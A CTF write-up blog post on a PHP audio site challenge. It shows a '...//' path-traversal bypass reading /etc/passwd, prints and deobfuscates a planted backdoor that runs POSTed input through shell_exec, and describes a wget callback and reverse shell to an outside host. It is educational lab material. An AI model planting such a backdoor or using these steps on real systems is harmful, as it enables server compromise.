---

layout: post

title: Source Zero Con Writeup - Compromised

gh-badge:

- star

- fork

- follow

tags:

- Linux

- PHP

- Forensics

- Web Apps

comments: true

published: true

date: '2023-06-23'

---

First of all, huge thanks to Optiv for putting Source Zero Con together. It's one of my favorite cons each year. They've got such an awesome team over there. Major props to everyone, from the CTF team to the speakers. Love you all <3 Keep up the great work. 

Alrighty, it's that time a year. CTF Time! I don't really do that many, but I always enjoy anything that this team puts out, so I always try to make it appoint to do them. I always find a few of the challenges super interesting - this one is no different. 

**Compromised** - This challenge was compromised of three parts, a bit of Web App and a bit of Forensics. Definitely unique, I haven't seen many of this type before, but I really enjoy it. I used to do Malware Analysis fairly reguarly as my day job, so maybe thats part of it. Anyways, let's dive into it.


### 0x1 - An Incident
The challenge narrative starts off like so:
```
Someone keeps hacking my audio streaming website and I don't know how! I think they left a backdoor or something! Can you take a look at it?
```
Sure! Why not, I'm already here. I might as well take a peaksy....

![[https://blog.spookysec.net/img/Pasted image 20230622143644.png]](https://blog.spookysec.net/img/Pasted image 20230622143644.png)

Here's the website, omfg. What a throwback. Aside from the awesome music, the first thing that immediately stands out to me is the download button on the site. Let's load up Burpsuite real quick and peak at the download button.

![[https://blog.spookysec.net/img/Pasted image 20230622143859.png]](https://blog.spookysec.net/img/Pasted image 20230622143859.png)

Clicking on the download button appears to send a GET request to download.php with a file parameter that appears to be a base64 encoded string. Burpsuite seems to think this string decodes to "omfg_hello.mp3" - I'd say thats probably pretty accurate. Let's take a peak at the sites JS source real quick to see validate the functionality.

![[https://blog.spookysec.net/img/Pasted image 20230622144223.png]](https://blog.spookysec.net/img/Pasted image 20230622144223.png)

Would you look at that! a flag! There doesn't appear to be any reference to base64, but we do have some track names. 

### 0x2 Local File Inclusion
Let's test some basic LFI payloads against the webapp and see if we can get any hits. Cyberchef is my tool of choice now a days for various encoding mechanisms, so let's try a basic ``../../../etc/passwd`` and see if we have any luck.

![[https://blog.spookysec.net/img/Pasted image 20230622144447.png]](https://blog.spookysec.net/img/Pasted image 20230622144447.png)

Sending it off to the Web App we can an interesting and informative response: ``The file /www/audio/..etc/passwd does not exist!``
![[https://blog.spookysec.net/img/Pasted image 20230622144514.png]](https://blog.spookysec.net/img/Pasted image 20230622144514.png)

It looks like the application may be stripping or replacing ``../`` with just ``.``, let's try ``...//...//`` in anticipation it will strip ``../`` from our request.

![[https://blog.spookysec.net/img/Pasted image 20230622144746.png]](https://blog.spookysec.net/img/Pasted image 20230622144746.png)

Success! We were able to leak the contents of /etc/passwd. Let's go take a peak at the challenge description to see if we can get any pointers as to what's next.

```
Did you find anything interesting yet? Is there a feature you can leverage to read the server-side code?
```

That's... actually a really good hint... Let's try to read download.php.

![[https://blog.spookysec.net/img/Pasted image 20230622144918.png]](https://blog.spookysec.net/img/Pasted image 20230622144918.png)

Would you look at that! A new flag. We must be on the right track. I don't see a backdoor anywhere around here though...

### 0x3 Analyzing the Backdoor
```
Now that you can read the server-side code, did you find any backdoor injected in them? If the answer is yes, try using that backdoor to read the flag located at the '/' directory!
```

Well, no. I haven't started looking. So far there's really only two files that are interpreted by the server; Index.php and Download.php. There may be more, but since we've leaked the source of Download.php, let's check out index.

![[https://blog.spookysec.net/img/Pasted image 20230622145246.png]](https://blog.spookysec.net/img/Pasted image 20230622145246.png)

Sure enough, there it is. That's a really nasty looking chunk of PHP - let's take a stab at decoding it. So, the first thing I like to do is add some newlines. My preferred method is to plop this guy in Sublime, search for all the semi-colons with ctrl+f, select alt+enter, move over **once** to the right and press "enter" to insert a newline. In the end we should be left with something like this:

```php
<?php $_=``.[];
$__=@$_;
$_= $__[0];
 $_1 = $__[2];
 $_1++;
 $_1++;
$_1++;
$_1++;
$_1++;
$_1++;
$_++;
$_++;
$_0 = $_;
$_++;
$_2 = ++$_;
 $_55 = '_'.(','^'|').('/'^'`').('-'^'~').(')'^'}');
 $_ = $_2.$_1.$_2.$_0;
 $_($$_55[_]);
?>
```

Well, that's certainly an interesting backdoor. When I first looked at this, I didn't really understand what in the world was going on. It's not quite obvious. My first instinct when i don't understand what's going on it to toss it immediately in ChatGPT!

That was a joke. I normally run the code to get a better understanding of how it's working. I like to use PHP's built in server - you can spawn it with ``php -S 0.0.0.0:80``. I saved the php file as ``backdoor.php``, so I'll have to hit that endpoint to make it load.

![[https://blog.spookysec.net/img/Pasted image 20230622145959.png]](https://blog.spookysec.net/img/Pasted image 20230622145959.png)

And we recieved a 500 error. This means an error occured on the servers end. Looking up at the console, there's a super menacing red line. The error states:
```
127.0.0.1:26423 [500]: GET /backdoor.php - Uncaught ValueError: shell_exec(): Argument #1 ($command) cannot be empty in /root/backdoor.php:1
Stack trace:
#0 /root/backdoor.php(1): shell_exec()
#1 {main}
  thrown in /root/backdoor.php on line 1
```

shell_exec? Well that's certainly weird, I don't see a shell_exec a round here any place. Apparently it's on Line 1 of the PHP script too - let's isolate that line:
```php
<?php $_=``.[];
```
So, we have a variable, two backticks, and a string to array conversion, huh. Somehow this translates into shell_exec. According to the PHP Documentation, backticks can be used to execute a shell command.
![[https://blog.spookysec.net/img/Pasted image 20230622153944.png]](https://blog.spookysec.net/img/Pasted image 20230622153944.png)

Well, thats certainly a TIL! So in theory, if we were to add, I don't know, let's say ``id`` into the backticks, we *should* get a valid page back! Let's give it a shot...

![[https://blog.spookysec.net/img/Pasted image 20230622154221.png]](https://blog.spookysec.net/img/Pasted image 20230622154221.png)

aannndddd failure. But this time we have a really interesting error:
```php
127.0.0.1:26724 [500]: GET /backdoor.php - Uncaught Error: Call to undefined function yjyw() in /root/backdoor.php:18
Stack trace:
#0 {main}
  thrown in /root/backdoor.php on line 18
```
Well thats interesting. I definitely don't recall seeing any functions in the script. This error is on line 18, let's investigate:
```php
$_($$_55[_]);
```

Huh, so we have *what looks like* a function call to \$_ with ``$$_55[_]`` as an argument. So, what is \$$55? Let's modify our PHP code to echo out the contents of \$$55. We'll comment out the function call below so we don't accidentally crash the program. I'm going to keep id supplied as well, just so it doesn't crash.

```php
<?php $_=`id`.[];
$__=@$_;
$_= $__[0];
 $_1 = $__[2];
<snip>
$_++;
$_0 = $_;
$_++;
$_2 = ++$_;
 $_55 = '_'.(','^'|').('/'^'`').('-'^'~').(')'^'}');
echo $_55;
 $_ = $_2.$_1.$_2.$_0;
 //$_($$_55[_]);
?>
```

And the contents are in! It's... \_POST.

![[https://blog.spookysec.net/img/Pasted image 20230622160750.png]](https://blog.spookysec.net/img/Pasted image 20230622160750.png)

Well isn't that interesting. Let's plug that in and see what it looks like:

```php
$_($_POST[_])
```

Well, that's starting to look more interesting. It looks like we have a function call to $_ where the server takes the \_ argument as a POST request. We can test this locally, though we should be at the point where we can try to gain RCE from this. We can try something like an HTTP callback with ``wget burpcollaburl``. 

And surprise! We got a callback.
![[https://blog.spookysec.net/img/Pasted image 20230623144707.png]](https://blog.spookysec.net/img/Pasted image 20230623144707.png)

Now, I had to borrow Szy's VPS for this because my ISP doesn't like port forwarding and I'm too lazy to setup NGROK; so, using a standard bash reverse shell, we can land on the host:

![[https://blog.spookysec.net/img/Pasted image 20230623144802.png]](https://blog.spookysec.net/img/Pasted image 20230623144802.png)

annnndddd I only have the text based output because Szy didn't send me a screenshot, so you'll just have to believe it worked :D

```
    www-data@comprom-1uocqb-1687450894-f49f96585-wb4jp:/www$ id
    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    www-data@comprom-1uocqb-1687450894-f49f96585-wb4jp:/www$ ls -al /
    ls -al /
    total 84
    drwxr-xr-x   1 root root 4096 Jun 22 16:21 .
    drwxr-xr-x   1 root root 4096 Jun 22 16:21 ..
    drwxr-xr-x   1 root root 4096 Nov 15  2022 bin
    drwxr-xr-x   2 root root 4096 Sep  3  2022 boot
    drwxr-xr-x   5 root root  360 Jun 22 16:21 dev
    drwxr-xr-x   1 root root 4096 Jun 22 16:21 etc
    -rw-r--r--   1 root root   35 Jun 22 13:28 flag_3_7764865c46bfce2c138e77ae5407354e.txt
    drwxr-xr-x   2 root root 4096 Sep  3  2022 home
    drwxr-xr-x   1 root root 4096 Nov 15  2022 lib
    drwxr-xr-x   2 root root 4096 Nov 14  2022 lib64
    drwxr-xr-x   2 root root 4096 Nov 14  2022 media
    drwxr-xr-x   2 root root 4096 Nov 14  2022 mnt
    drwxr-xr-x   2 root root 4096 Nov 14  2022 opt
    dr-xr-xr-x 296 root root    0 Jun 22 16:21 proc
    drwx------   1 root root 4096 Nov 15  2022 root
    drwxr-xr-x   1 root root 4096 Nov 15  2022 run
    drwxr-xr-x   1 root root 4096 Nov 15  2022 sbin
    drwxr-xr-x   2 root root 4096 Nov 14  2022 srv
    dr-xr-xr-x  13 root root    0 Jun 22 16:21 sys
    drwxrwxrwt   1 root root 4096 Jun 22 13:28 tmp
    drwxr-xr-x   1 root root 4096 Nov 14  2022 usr
    drwxr-xr-x   1 root root 4096 Nov 15  2022 var
    www-data@comprom-1uocqb-1687450894-f49f96585-wb4jp:/www$ cat flag_3_7764865c46bfce2c138e77ae5407354e.txt
    <w$ cat /flag_3_7764865c46bfce2c138e77ae5407354e.txt     
    flag{p3rs1s<snip>32}
```

Closing notes: I know I skipped over a lot of the PHP code, that's mainly because most of it was mutating the output and wasn't actually used in any way that was meaningful. Other than that, that's all she wrote for this challenge! A simple LFI -> Reverse Engineering a backdoor -> simple RCE.

Hope you enjoyed
~ Ronnie
